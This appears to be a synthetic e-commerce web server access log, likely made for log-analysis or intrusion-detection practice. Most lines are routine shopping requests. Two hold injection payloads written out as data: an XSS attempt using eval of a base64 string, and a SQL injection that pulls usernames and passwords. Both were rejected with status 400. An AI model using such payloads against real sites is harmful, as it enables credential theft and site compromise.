192.168.1.27 - - [15/Jun/2025:00:52:13 +0000] "GET /api/cart/add HTTP/1.1" 404 4570 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:26:03 +0000] "GET /search?q=laptop HTTP/1.1" 200 3344 "-" "curl/8.5.0"
192.168.1.42 - - [15/Jun/2025:00:46:55 +0000] "GET /api/user/profile HTTP/1.1" 200 2489 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:19:59 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 306 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.32 - - [15/Jun/2025:00:45:05 +0000] "GET /cart HTTP/1.1" 200 6886 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.20 - - [15/Jun/2025:00:47:26 +0000] "GET /api/user/profile HTTP/1.1" 200 2273 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.42 - - [15/Jun/2025:00:44:57 +0000] "GET /api/user/profile HTTP/1.1" 200 6016 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:26:15 +0000] "GET /static/js/app.js HTTP/1.1" 200 1543 "-" "python-requests/2.31.0"
45.152.66.201 - - [15/Jun/2025:00:26:29 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 3043 "-" "python-requests/2.31.0"
203.0.113.77 - - [15/Jun/2025:00:22:32 +0000] "GET /api/products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 400 528 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.34 - - [15/Jun/2025:00:54:16 +0000] "GET /api/products?category=clothing HTTP/1.1" 304 6621 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
